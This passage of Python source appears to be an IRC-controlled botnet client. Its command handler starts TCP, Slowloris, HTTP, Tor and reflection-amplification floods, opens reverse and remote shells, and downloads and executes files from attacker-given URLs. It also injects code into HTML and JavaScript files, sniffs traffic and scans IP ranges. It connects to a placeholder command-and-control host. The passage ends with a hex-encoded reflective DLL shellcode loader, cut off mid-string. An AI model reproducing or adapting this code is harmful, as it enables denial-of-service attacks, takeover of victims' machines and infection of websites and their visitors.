                    threading.Thread(target=self.tcp_attack,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6],))).start()
                self.commSock.send("PRIVMSG %s :Started TCP flood on %s:%s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "slowloris":
                threading.Thread(target=self.slowloris,args=(argumentdata[4],int(argumentdata[5]),int(argumentdata[6],))).start()
                self.commSock.send("PRIVMSG %s :Started Slowloris on %s with %s sockets\n" % (SendEr,argumentdata[4],argumentdata[5]))
            elif argumentdata[3]==":" + self.cmdprefix + "httpflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.https_rflood,args=(argumentdata[4],argumentdata[5],int(argumentdata[6]),)).start()
                self.commSock.send("PRIVMSG %s :Started HTTP flood on URL: %s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "torflood":
                for i in range(0, int(argumentdata[7])):
                    threading.Thread(target=self.https_rfloodTor,args=(argumentdata[4],argumentdata[5],int(argumentdata[6]),)).start()
                self.commSock.send("PRIVMSG %s :Started Tor HTTP flood on URL: %s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[7]))
            elif argumentdata[3]==":" + self.cmdprefix + "loadamp":
                self.commSock.send("PRIVMSG %s :Downloading %s list from %s\n" % (SendEr,argumentdata[4],argumentdata[5]))
                threading.Thread(target=urllib.urlretrieve, args=(argumentdata[5], "."+argumentdata[4],)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "assault":
                argumentdata[4]=argumentdata[4].upper()
                for i in range(0, int(argumentdata[8])):
                    threading.Thread(target=self.iprange_assault, args=(argumentdata[4], argumentdata[5], int(argumentdata[6]), int(argumentdata[7]),)).start()
                self.commSock.send("PRIVMSG %s :Started IP range assault on class %s ip range %s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[8]))
            elif argumentdata[3]==":" + self.cmdprefix + "reconnect":
                qsPrHtiu = 0
                try:
                    self.commSock.close()
                except:
                    pass
                self.IRCConnect()
            elif argumentdata[3]==":" + self.cmdprefix + "reflect":
                try:
                    if not os.path.exists("."+argumentdata[4]):
                        self.commSock.send("PRIVMSG %s :Please load this type of amp list first\n" % (SendEr))
                        return
                    self.commSock.send("PRIVMSG %s :Started %s amp flood on %s with %s threads\n" % (SendEr,argumentdata[4],argumentdata[5],argumentdata[7]))
                    self.ATTAKMYBRUDDA(argumentdata[4], socket.gethostbyname(argumentdata[5]), int(argumentdata[6]), int(argumentdata[7]))
                except:
                    pass
            elif argumentdata[3]==":" + self.cmdprefix + "addport":
                if int(argumentdata[4]) not in portlist:
                    portlist.append(int(argumentdata[4]))
                    self.commSock.send("PRIVMSG %s :Added port %s to scanner\n" % (SendEr,argumentdata[4]))
            elif argumentdata[3]==":" + self.cmdprefix + "delport":
                if int(argumentdata[4]) in portlist:
                    portlist.remove(int(argumentdata[4]))
                    self.commSock.send("PRIVMSG %s :Removed port %s from scanner\n" % (SendEr,argumentdata[4]))
            elif argumentdata[3]==":" + self.cmdprefix + "ports":
                self.commSock.send("PRIVMSG %s :I am currently scanning %s\n"% (SendEr,str(portlist)))
            elif argumentdata[3]==":" + self.cmdprefix + "injectcount":
                self.commSock.send("PRIVMSG %s :I have injected into %s files total\n" % (SendEr, self.jsfilesbdoored))
            elif argumentdata[3]==":" + self.cmdprefix + "reinject":
                threading.Thread(target=self.infecthtmljs).start()
                self.commSock.send("PRIVMSG %s :Re-injecting all html and js files\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "scanner":
                if argumentdata[4]=="resume":
                    self.scannerenabled=1
                    self.commSock.send("PRIVMSG %s :Scanner resumed!\n" % (SendEr))
                else:
                    self.scannerenabled=0
                    self.commSock.send("PRIVMSG %s :Scanner paused!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "sniffer":
                if argumentdata[4]=="resume":
                    if self.snifferenabled==0:
                        self.snifferenabled=1
                        self.commSock.send("PRIVMSG %s :Sniffer resumed!\n" % (SendEr))
                else:
                    if self.snifferenabled==1:
                        self.snifferenabled=0
                        self.commSock.send("PRIVMSG %s :Sniffer paused!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "scannetrange":
                threading.Thread(target=self.CUhKIvCh,args=(argumentdata[4],argumentdata[5],argumentdata[6],)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "scanstats":
                try:
                    if argumentdata[4] == "all":
                        ranges=""
                        totalscanned=0
                        foundopen=0
                        foundopen = 0
                        for index,keyname in enumerate(self.exploitstats):
                            if keyname != "gaybots":
                                ranges+=keyname + ", "
                                total1,foundopen1=self.exploitstats[keyname]
                                totalscanned+=total1
                                foundopen+=foundopen1
                        if ranges != ", ":
                            self.commSock.send("PRIVMSG %s :IP Ranges scanned: %stotal all time IPs scanned: %s, total found open: %s\n" % (SendEr, ranges,str(totalscanned), str(foundopen)))
                        else:
                            self.commSock.send("PRIVMSG %s :Scanner DB empty\n" % (SendEr))
                    elif self.exploitstats[argumentdata[4]][0]:
                        self.commSock.send("PRIVMSG %s :Scanner stats for: %s total scanned: %s, total open: %s\n" % (SendEr, argumentdata[4], str(self.exploitstats[argumentdata[4]][0]), str(self.exploitstats[argumentdata[4]][1])))
                except:
                    self.commSock.send("PRIVMSG %s :No scanner stats for: %s\n" % (SendEr, argumentdata[4]))
            elif argumentdata[3]==":" + self.cmdprefix + "clearscan":
                self.exploitstats={"gaybots":[0,0]}
                self.commSock.send("PRIVMSG %s :Scanner DB emptied\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "revshell":
                threading.Thread(target=self.reverseShell, args=(argumentdata[4],argumentdata[5],)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "shell":
                threading.Thread(target=self.shell_,args=(" ".join(argumentdata[4:]),SendEr,)).start()
            elif argumentdata[3]==":" + self.cmdprefix + "download":
                try:
                    urllib.urlretrieve(argumentdata[4],argumentdata[5])
                    self.commSock.send("PRIVMSG %s :Downloaded\n" % (SendEr))
                except:
                    self.commSock.send("PRIVMSG %s :Could not download!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "killknight":
                os.kill(os.getpid(),9)
            elif argumentdata[3]==":" + self.cmdprefix + "execute":
                try:
                    urllib.urlretrieve(argumentdata[4],argumentdata[5])
                    if not os.name == 'nt':
                        try:
                            os.chmod(argumentdata[5], 777)
                        except:
                            pass
                    subprocess.Popen([("%s" % argumentdata[5])])
                    self.commSock.send("PRIVMSG %s :Downloaded and executed\n" % (SendEr))
                except:
                    self.commSock.send("PRIVMSG %s :Could not download or execute!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "killbyname":
                if os.name == "nt":
                    os.popen("taskkill /f /im %s" % argumentdata[4])
                else:
                    os.popen("pkill -9 %s" % argumentdata[4])
                    os.popen("killall -9 %s" % argumentdata[4])
                self.commSock.send("PRIVMSG %s :Killed\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "killbypid":
                os.kill(int(argumentdata[4]),9)
                self.commSock.send("PRIVMSG %s :Killed\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "disable":
                self.stopshit=1
                self.commSock.send("PRIVMSG %s :Disabled attacks and scans!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "enable":
                self.stopshit=0
                self.commSock.send("PRIVMSG %s :Re-enabled attacks and scans!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "getip":
                self.commSock.send("PRIVMSG %s :%s\n" % (SendEr,self.getMyCurrentIP()))
            elif argumentdata[3]==":" + self.cmdprefix + "ram":
                mem_kib = 0
                if os.name == "nt":
                    mem_kib = psutil.virtual_memory().total / 1024
                else:
                    meminfo = dict((i.split()[0].rstrip(':'),int(i.split()[1])) for i in open('/proc/meminfo').readlines())
                    mem_kib = meminfo['MemTotal']
                self.commSock.send("PRIVMSG %s :%s MB RAM total\n" % (SendEr, mem_kib/1024))
            elif argumentdata[3]==":" + self.cmdprefix + "update":
                try:
                    if argumentdata[5]:
                        threading.Thread(target=self.reverseShell, args=(argumentdata[4], int(argumentdata[5]),)).start()
                        self.commSock.send("PRIVMSG %s :Updating\n" % (SendEr))
                        time.sleep(10)
                        os.kill(os.getpid(),9)
                except:
                    self.commSock.send("PRIVMSG %s :Failed to start thread\n" % (SendEr))
                    pass
            elif argumentdata[3]==":" + self.cmdprefix + "visit":
                if os.name == "nt":
                    webbrowser.open(argumentdata[4])
                    self.commSock.send("PRIVMSG %s :Visited!\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "dlexe":
                if os.name == "nt":
                    try:
                        threading.Thread(target=self.dlexe, args=(argumentdata[4], os.getenv("TEMP") + "\\" + argumentdata[5],)).start()
                        self.commSock.send("PRIVMSG %s :Download and execute task started!\n" % (SendEr))
                    except:
                        pass
            elif argumentdata[3]==":" + self.cmdprefix + "info":
                sysinfo=""
                sysinfo+="Architecture: " + platform.architecture()[0]
                sysinfo+=" Machine: " + platform.machine()
                sysinfo+=" Node: " + platform.node()
                sysinfo+=" System: " + platform.system()
                try:
                    if os.name == "nt":
                        dist = platform.platform()
                    else:
                        dist = platform.dist()
                        dist = " ".join(x for x in dist)
                        sysinfo+=" Distribution: " + dist
                except:
                    pass
                sysinfo+=" processors: "
                if os.name == "nt":
                    sysinfo+="0-" + str(self.available_cpu_count()) + " "
                    sysinfo+=platform.processor()
                else:
                    with open("/proc/cpuinfo", "r")  as f:
                        info = f.readlines()
                    cpuinfo = [x.strip().split(":")[1] for x in info if "model name"  in x]
                    seencpus=[]
                    last = len(cpuinfo)
                    for index, item in enumerate(cpuinfo):
                        if item not in seencpus:
                            seencpus.append(item)
                            sysinfo+=str(index) + "-" + str(last) +  item
                        last-=1
                self.commSock.send("PRIVMSG %s :%s\n" % (SendEr, sysinfo))
            elif argumentdata[3]==":" + self.cmdprefix + "repack":
                if myfullpath.endswith(".py"):
                    try:
                        self.repackbot()
                        self.commSock.send("PRIVMSG %s :Repacked code!\n" % (SendEr))
                    except:
                        self.commSock.send("PRIVMSG %s :Failed to repack\n" % (SendEr))
                else:
                    self.commSock.send("PRIVMSG %s :Running as binary, not repacking\n" % (SendEr))
            elif argumentdata[3]==":" + self.cmdprefix + "fileprotect":
                if argumentdata[4] == "on":
                    try:
                        self.fileprotect=1
                        threading.Thread(target=self.massiverift).start()
                    except:
                        self.fileprotect=0
                    self.commSock.send("PRIVMSG %s :File-protection status: "  + "active!" if fileprotect else "failed to start thread." + "\n" % (SendEr))
                if argumentdata[4] == "off":
                    self.fileprotect=0
                    self.commSock.send("PRIVMSG %s :File-protection status: disabled\n" % (SendEr))
        except:
            pass
    def IRCConnect(self):
        global loggedin
        i=0
        while 1:
            try:
                self.commSock=socket.socket()
                self.commSock.connect(("YOURCNCHERE", 6697))
                self.commSock=ssl.wrap_socket(self.commSock)  
                self.commSock.send("NICK %s\n" % self.hLqhZnCt)
                self.commSock.send("USER %s * localhost :%s\n" % (self.aRHRPteL, self.botid))
                ircbuf=""
                joinedchan=0
                loggedin=-1
                while 1:
                    try:
                        ircbuf=ircbuf+self.commSock.recv(2048)
                        if ircbuf == "":
                            break
                        dbOkhWET=ircbuf.split("\n")
                        ircbuf=dbOkhWET.pop( )
                        for argumentdata in dbOkhWET:
                            ircLine=argumentdata
                            argumentdata=argumentdata.rstrip()
                            argumentdata=argumentdata.split()
                            if argumentdata[0]=="PING":
                                self.commSock.send("PONG %s\n" % argumentdata[1])
                            elif argumentdata[1]=="376" or argumentdata[1]=="422" or argumentdata[1]=="352":
                                if joinedchan == 0:
                                    self.commSock.send("JOIN %s %s\n" % (self.mychan,self.chankey))
                                    joinedchan = 1
                            elif argumentdata[1]=="433":
                                self.botid=randomstring(random.randrange(8,12))
                                self.hLqhZnCt="[HAX|"+platform.system()+"|"+platform.machine()+"|"+str(self.available_cpu_count())+"]"+str(self.botid)
                                self.commSock.send("NICK %s\n" % self.hLqhZnCt)
                            if loggedin==-1:
                                SendEr=ircLine[:ircLine.find('!')][1:]
                                try:
                                    if argumentdata[3]==":" +self.cmdprefix + "login":
                                        if self.knightpasswd == argumentdata[4] and SendEr in self.masters:
                                            loggedin=1024
                                            self.commSock.send("PRIVMSG %s :Authorization successful\n" % (self.mychan))
                                        else:
                                            self.commSock.send("PRIVMSG %s :Authorization failed\n" % (self.mychan))
                                            continue
                                except:
                                    pass
                            elif loggedin > 0 and SendEr in self.masters:
                                try:
                                    self.interpretcmd(argumentdata)
                                except:
                                    pass
                    except:
                        try:
                            self.commSock.send("NOTICE " + self.hLqhZnCt + " :PING\n")
                            continue
                        except:
                            break
            except:
                myproxy=random.choice(proxylist)
                continue
MACHINE_IA64=512
MACHINE_AMD64=34404
def is64BitDLL(bytes):
    header_offset = struct.unpack("<L", bytes[60:64])[0]
    macheine = struct.unpack("<H", bytes[header_offset+4:header_offset+4+2])[0]
    if macheine == MACHINE_IA64 or macheine == MACHINE_AMD64:
        return True   
    return False
def ConvertToShellcode(dllBytes, functionHash=0x10, userData=b'None', asdflags=0):
    rdiShellcode32 = b'\x81\xEC\x14\x01\x00\x00\x53\x55\x56\x57\x6A\x6B\x58\x6A\x65\x66\x89\x84\x24\xCC\x00\x00\x00\x33\xED\x58\x6A\x72\x59\x6A\x6E\x5B\x6A\x6C\x5A\x6A\x33\x66\x89\x84\x24\xCE\x00\x00\x00\x66\x89\x84\x24\xD4\x00\x00\x00\x58\x6A\x32\x66\x89\x84\x24\xD8\x00\x00\x00\x58\x6A\x2E\x66\x89\x84\x24\xDA\x00\x00\x00\x58\x6A\x64\x66\x89\x84\x24\xDC\x00\x00\x00\x58\x89\xAC\x24\xB0\x00\x00\x00\x89\x6C\x24\x34\x89\xAC\x24\xB8\x00\x00\x00\x89\xAC\x24\xC4\x00\x00\x00\x89\xAC\x24\xB4\x00\x00\x00\x89\xAC\x24\xAC\x00\x00\x00\x89\xAC\x24\xE0\x00\x00\x00\x66\x89\x8C\x24\xCC\x00\x00\x00\x66\x89\x9C\x24\xCE\x00\x00\x00\x66\x89\x94\x24\xD2\x00\x00\x00\x66\x89\x84\x24\xDA\x00\x00\x00\x66\x89\x94\x24\xDC\x00\x00\x00\x66\x89\x94\x24\xDE\x00\x00\x00\xC6\x44\x24\x3C\x53\x88\x54\x24\x3D\x66\xC7\x44\x24\x3E\x65\x65\xC6\x44\x24\x40\x70\x66\xC7\x44\x24\x50\x4C\x6F\xC6\x44\x24\x52\x61\x88\x44\x24\x53\x66\xC7\x44\x24\x54\x4C\x69\xC6\x44\x24\x56\x62\x88\x4C\x24\x57\xC6\x44\x24\x58\x61\x88\x4C\x24\x59\x66\xC7\x44\x24\x5A\x79\x41\x66\xC7\x44\x24\x44\x56\x69\x88\x4C\x24\x46\x66\xC7\x44\x24\x47\x74\x75\xC6\x44\x24\x49\x61\x88\x54\x24\x4A\xC6\x44\x24\x4B\x41\x88\x54\x24\x4C\x88\x54\x24\x4D\x66\xC7\x44\x24\x4E\x6F\x63\x66\xC7\x44\x24\x5C\x56\x69\x88\x4C\x24\x5E\x66\xC7\x44\x24\x5F\x74\x75\xC6\x44\x24\x61\x61\x88\x54\x24\x62\xC6\x44\x24\x63\x50\x88\x4C\x24\x64\xC7\x44\x24\x65\x6F\x74\x65\x63\xC6\x44\x24\x69\x74\xC6\x84\x24\x94\x00\x00\x00\x46\x88\x94\x24\x95\x00\x00\x00\xC7\x84\x24\x96\x00\x00\x00\x75\x73\x68\x49\x88\x9C\x24\x9A\x00\x00\x00\x66\xC7\x84\x24\x9B\x00\x00\x00\x73\x74\x88\x8C\x24\x9D\x00\x00\x00\xC7\x84\x24\x9E\x00\x00\x00\x75\x63\x74\x69\xC6\x84\x24\xA2\x00\x00\x00\x6F\x6A\x65\x59\x88\x8C\x24\xA8\x00\x00\x00\x88\x4C\x24\x6D\x88\x4C\x24\x74\x88\x4C\x24\x79\x88\x8C\x24\x92\x00\x00\x00\xB9\x13\x9C\xBF\xBD\x88\x9C\x24\xA3\x00\x00\x00\xC7\x84\x24\xA4\x00\x00\x00\x43\x61\x63\x68\xC6\x44\x24\x6C\x47\xC7\x44\x24\x6E\x74\x4E\x61\x74\x66\xC7\x44\x24\x72\x69\x76\xC7\x44\x24\x75\x53\x79\x73\x74\x66\xC7\x44\x24\x7A\x6D\x49\x88\x5C\x24\x7C\x66\xC7\x44\x24\x7D\x66\x6F\x66\xC7\x84\x24\x80\x00\x00\x00\x52\x74\x88\x94\x24\x82\x00\x00\x00\xC6\x84\x24\x83\x00\x00\x00\x41\x88\x84\x24\x84\x00\x00\x00\x88\x84\x24\x85\x00\x00\x00\x66\xC7\x84\x24\x86\x00\x00\x00\x46\x75\x88\x9C\x24\x88\x00\x00\x00\xC7\x84\x24\x89\x00\x00\x00\x63\x74\x69\x6F\x88\x9C\x24\x8D\x00\x00\x00\x66\xC7\x84\x24\x8E\x00\x00\x00\x54\x61\xC6\x84\x24\x90\x00\x00\x00\x62\x88\x94\x24\x91\x00\x00\x00\xE8\x77\x08\x00\x00\xB9\xB5\x41\xD9\x5E\x8B\xF0\xE8\x6B\x08\x00\x00\x8B\xD8\x8D\x84\x24\xC8\x00\x00\x00\x6A\x18\x89\x84\x24\xEC\x00\x00\x00\x58\x66\x89\x84\x24\xE6\x00\x00\x00\x66\x89\x84\x24\xE4\x00\x00\x00\x8D\x44\x24\x1C\x50\x8D\x84\x24\xE8\x00\x00\x00\x89\x5C\x24\x34\x50\x55\x55\xFF\xD6\x6A\x0C\x5F\x8D\x44\x24\x44\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x44\x24\x34\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x0E\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x5C\x89\x44\x24\x18\x8D\x84\x24\xB4\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x15\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x84\x24\x94\x00\x00\x00\x89\x44\x24\x18\x8D\x84\x24\xB8\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x13\x5E\x8D\x44\x24\x6C\x66\x89\x74\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xC4\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x74\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x6A\x05\x58\x66\x89\x44\x24\x14\x66\x89\x44\x24\x16\x8D\x44\x24\x3C\x89\x44\x24\x18\x8D\x84\x24\xAC\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x84\x24\x80\x00\x00\x00\x66\x89\x74\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xE0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x74\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x8D\x44\x24\x50\x66\x89\x7C\x24\x14\x89\x44\x24\x18\x8D\x84\x24\xB0\x00\x00\x00\x50\x55\x8D\x44\x24\x1C\x66\x89\x7C\x24\x1E\x50\xFF\x74\x24\x28\xFF\xD3\x39\x6C\x24\x34\x0F\x84\x00\x07\x00\x00\x39\xAC\x24\xB4\x00\x00\x00\x0F\x84\xF3\x06\x00\x00\x39\xAC\x24\xAC\x00\x00\x00\x0F\x84\xE6\x06\x00\x00\x39\xAC\x24\xB8\x00\x00\x00\x0F\x84\xD9\x06\x00\x00\x8B\xAC\x24\xC4\x00\x00\x00\x85\xED\x0F\x84\xCA\x06\x00\x00\x8B\xBC\x24\x28\x01\x00\x00\x8B\x77\x3C\x03\xF7\x81\x3E\x50\x45\x00\x00\x0F\x85\xB2\x06\x00\x00\xB8\x4C\x01\x00\x00\x66\x39\x46\x04\x0F\x85\xA3\x06\x00\x00\xF6\x46\x38\x01\x0F\x85\x99\x06\x00\x00\x0F\xB7\x4E\x14\x33\xDB\x0F\xB7\x56\x06\x83\xC1\x24\x85\xD2\x74\x1E\x03\xCE\x83\x79\x04\x00\x8B\x46\x38\x0F\x45\x41\x04\x03\x01\x8D\x49\x28\x3B\xC3\x0F\x46\xC3\x8B\xD8\x83\xEA\x01\x75\xE4\x8D\x84\x24\x00\x01\x00\x00\x50\xFF\xD5\x8B\x8C\x24\x04\x01\x00\x00\x8D\x51\xFF\x8D\x69\xFF\xF7\xD2\x03\x6E\x50\x8D\x41\xFF\x03\xC3\x23\xEA\x23\xC2\x3B\xE8\x0F\x85\x3D\x06\x00\x00\x6A\x04\x68\x00\x30\x00\x00\x55\xFF\x76\x34\xFF\x54\x24\x44\x8B\xD8\x89\x5C\x24\x2C\x85\xDB\x75\x13\x6A\x04\x68\x00\x30\x00\x00\x55\x50\xFF\x54\x24\x44\x8B\xD8\x89\x44\x24\x2C\xF6\x84\x24\x38\x01\x00\x00\x01\x74\x23\x8B\x47\x3C\x89\x43\x3C\x8B\x4F\x3C\x3B\x4E\x54\x73\x2E\x8B\xEF\x8D\x14\x0B\x2B\xEB\x8A\x04\x2A\x41\x88\x02\x42\x3B\x4E\x54\x72\xF4\xEB\x19\x33\xED\x39\x6E\x54\x76\x12\x8B\xD7\x8B\xCB\x2B\xD3\x8A\x04\x11\x45\x88\x01\x41\x3B\x6E\x54\x72\xF4\x8B\x6B\x3C\x33\xC9\x03\xEB\x89\x4C\x24\x10\x33\xC0\x89\x6C\x24\x28\x0F\xB7\x55\x14\x83\xC2\x28\x66\x3B\x45\x06\x73\x31\x03\xD5\x33\xF6\x39\x32\x76\x19\x8B\x42\x04\x8B\x4A\xFC\x03\xC6\x03\xCB\x8A\x04\x38\x88\x04\x31\x46\x3B\x32\x72\xEB\x8B\x4C\x24\x10\x0F\xB7\x45\x06\x41\x83\xC2\x28\x89\x4C\x24\x10\x3B\xC8\x72\xD1\x8B\xC3\xC7\x84\x24\xBC\x00\x00\x00\x01\x00\x00\x00\x2B\x45\x34\x89\x44\x24\x24\x0F\x84\xC4\x00\x00\x00\x83\xBD\xA4\x00\x00\x00\x00\x0F\x84\xB7\x00\x00\x00\x8B\xB5\xA0\x00\x00\x00\x03\xF3\x83\x3E\x00\x0F\x84\xA6\x00\x00\x00\x6A\x02\x8B\xF8\x5D\x8D\x56\x08\xEB\x75\x0F\xB7\x02\x89\x44\x24\x10\x0F\xB7\xC8\x66\xC1\xE8\x0C\x66\x83\xF8\x0A\x75\x28\x8B\x16\x8B\x4C\x24\x10\x81\xE1\xFF\x0F\x00\x00\x89\x4C\x24\x10\x8D\x04\x1A\x8B\x0C\x08\x8D\x04\x1A\x8B\x54\x24\x10\x03\xCF\x89\x0C\x10\x8B\x54\x24\x24\xEB\x37\x66\x83\xF8\x03\x75\x0D\x81\xE1\xFF\x0F\x00\x00\x03\x0E\x01\x3C\x19\xEB\x24\x66\x3B\x84\x24\xBC\x00\x00\x00\x75\x07\x8B\xC7\xC1\xE8\x10\xEB\x08\x66\x3B\xC5\x75\x0E\x0F\xB7\xC7\x81\xE1\xFF\x0F\x00\x00\x03\x0E\x01\x04\x19\x03\xD5\x8B\x46\x04\x03\xC6\x89\x54\x24\x24\x3B\xD0\x0F\x85\x7A\xFF\xFF\xFF\x83\x3A\x00\x8B\xF2\x0F\x85\x6A\xFF\xFF\xFF\x8B\x6C\x24\x28\x8B\xBC\x24\x28\x01\x00\x00\x83\xBD\x84\x00\x00\x00\x00\x0F\x84\xD7\x01\x00\x00\x8B\xB5\x80\x00\x00\x00\x33\xC0\x89\x44\x24\x10\x8D\x0C\x1E\x89\x4C\x24\x24\x83\xC1\x0C\x39\x01\x74\x0D\x8D\x49\x14\x40\x83\x39\x00\x75\xF7\x89\x44\x24\x10\x8B\x8C\x24\x38\x01\x00\x00\x8B\xD1\x83\xE2\x04\x89\x54\x24\x38\x8B\xD6\x0F\x84\xC3\x00\x00\x00\x83\xF8\x01\x0F\x86\xBA\x00\x00\x00\x83\xA4\x24\xBC\x00\x00\x00\x00\xC1\xE9\x10\x89\x8C\x24\x38\x01\x00\x00\x8D\x48\xFF\x89\x8C\x24\xC0\x00\x00\x00\x85\xC9\x0F\x84\xA1\x00\x00\x00\x8B\x74\x24\x24\x8B\xDE\x8B\xAC\x24\xBC\x00\x00\x00\x8B\xC8\x69\xFF\xFD\x43\x03\x00\x2B\xCD\x33\xD2\xB8\xFF\x7F\x00\x00\xF7\xF1\x81\xC7\xC3\x9E\x26\x00\x33\xD2\x89\xBC\x24\x28\x01\x00\x00\x6A\x05\x8D\x48\x01\x8B\xC7\xC1\xE8\x10\x8D\xBC\x24\xF0\x00\x00\x00\x25\xFF\x7F\x00\x00\xF7\xF1\x59\x03\xC5\x6B\xC0\x14\x6A\x05\x03\xC6\x45\x8B\xF0\xF3\xA5\x59\x8B\xF3\x8B\xF8\x8B\x44\x24\x10\xF3\xA5\x6A\x05\x8B\xFB\x8D\xB4\x24\xF0\x00\x00\x00\x59\xF3\xA5\x8B\xBC\x24\x28\x01\x00\x00\x83\xC3\x14\x8B\x74\x24\x24\x3B\xAC\x24\xC0\x00\x00\x00\x72\x87\x8B\x6C\x24\x28\x8B\x5C\x24\x2C\x8B\x95\x80\x00\x00\x00\xEB\x0B\x8B\x44\x24\x38\x89\x84\x24\x38\x01\x00\x00\x8D\x3C\x1A\x8B\x47\x0C\x89\x7C\x24\x2C\x85\xC0\x0F\x84\xB8\x00\x00\x00\x03\xC3\x50\xFF\x94\x24\xB4\x00\x00\x00\x8B\xD0\x89\x54\x24\x1C\x8B\x37\x8B\x6F\x10\x03\xF3\x03\xEB\x8B\x0E\x85\xC9\x74\x60\x8B\x7C\x24\x30\x85\xC9\x79\x09\x0F\xB7\x06\x55\x50\x6A\x00\xEB\x36\x83\xC1\x02\x33\xC0\x03\xCB\x89\x8C\x24\xC0\x00\x00\x00\x38\x01\x74\x0E\x40\x41\x80\x39\x00\x75\xF9\x8B\x8C\x24\xC0\x00\x00\x00\x55\x66\x89\x44\x24\x18\x66\x89\x44\x24\x1A\x8D\x44\x24\x18\x6A\x00\x89\x4C\x24\x20\x50\x52\xFF\xD7\x83\xC6\x04\x83\xC5\x04\x8B\x0E\x85\xC9\x74\x06\x8B\x54\x24\x1C\xEB\xA8\x8B\x7C\x24\x2C\x83\x7C\x24\x38\x00\x74\x1C\x33\xC0\x40\x39\x44\x24\x10\x76\x13\x69\x84\x24\x38\x01\x00\x00\xE8\x03\x00\x00\x50\xFF\x94\x24\xB0\x00\x00\x00\x8B\x47\x20\x83\xC7\x14\x89\x7C\x24\x2C\x85\xC0\x0F\x85\x4C\xFF\xFF\xFF\x8B\x6C\x24\x28\x83\xBD\xE4\x00\x00\x00\x00\x0F\x84\xAD\x00\x00\x00\x8B\x85\xE0\x00\x00\x00\x83\xC0\x04\x03\xC3\x89\x44\x24\x10\x8B\x00\x85\xC0\x0F\x84\x94\x00\x00\x00\x8B\x6C\x24\x10\x03\xC3\x50\xFF\x94\x24\xB4\x00\x00\x00\x8B\xC8\x89\x4C\x24\x1C\x8B\x75\x08\x8B\x7D\x0C\x03\xF3\x03\xFB\x83\x3E\x00\x74\x5B\x8B\x6C\x24\x30\x8B\x17\x85\xD2\x79\x09\x56\x0F\xB7\xC2\x50\x6A\x00\xEB\x30\x83\xC2\x02\x33\xC0\x03\xD3\x89\x54\x24\x38\x38\x02\x74\x0B\x40\x42\x80\x3A\x00\x75\xF9\x8B\x54\x24\x38\x56\x66\x89\x44\x24\x18\x66\x89\x44\x24\x1A\x8D\x44\x24\x18\x6A\x00\x89\x54\x24\x20\x50\x51\xFF\xD5\x83\xC6\x04\x83\xC7\x04\x83\x3E\x00\x74\x06\x8B\x4C\x24\x1C\xEB\xAD\x8B\x6C\x24\x10\x83\xC5\x20\x89\x6C\x24\x10\x8B\x45\x00\x85\xC0\x0F\x85\x74\xFF\xFF\xFF\x8B\x6C\x24\x28\x0F\xB7\x75\x14\x33\xC0\x83\xC6\x28\x33\xFF\x66\x3B\x45\x06\x0F\x83\xE5\x00\x00\x00\x03\xF5\xBA\x00\x00\x00\x40\x83\x3E\x00\x0F\x84\xC5\x00\x00\x00\x8B\x4E\x14\x8B\xC1\x25\x00\x00\x00\x20\x75\x0B\x85\xCA\x75\x07\x85\xC9\x78\x03\x40\xEB\x62\x85\xC0\x75\x30\x85\xCA\x75\x08\x85\xC9\x79\x04\x6A\x08\xEB\x51\x85\xC0\x75\x20\x85\xCA\x74\x08\x85\xC9\x78\x04\x6A\x02\xEB\x41\x85\xC0\x75\x10\x85\xCA\x74\x08\x85\xC9\x79\x04\x6A\x04\xEB\x31\x85\xC0\x74\x4A\x85\xCA\x75\x08\x85\xC9\x78\x04\x6A\x10\xEB\x21\x85\xC0\x74\x3A\x85\xCA\x75\x0B\x85\xC9\x79\x07\xB8\x80\x00\x00\x00\xEB\x0F\x85\xC0\x74\x27\x85\xCA\x74\x0D\x85\xC9\x78\x09\x6A\x20\x58\x89\x44\x24\x20\xEB\x1A\x85\xC0\x74\x12\x85\xCA\x74\x0E\x8B\x44\x24\x20\x85\xC9\x6A\x40\x5A\x0F\x48\xC2\xEB\xE4\x8B\x44\x24\x20\xF7\x46\x14\x00\x00\x00\x04\x74\x09\x0D\x00\x02\x00\x00\x89\x44\x24\x20\x8D\x4C\x24\x20\x51\x50\x8B\x46\xFC\xFF\x36\x03\xC3\x50\xFF\x94\x24\xC4\x00\x00\x00\xBA\x00\x00\x00\x40\x0F\xB7\x45\x06\x47\x83\xC6\x28\x3B\xF8\x0F\x82\x22\xFF\xF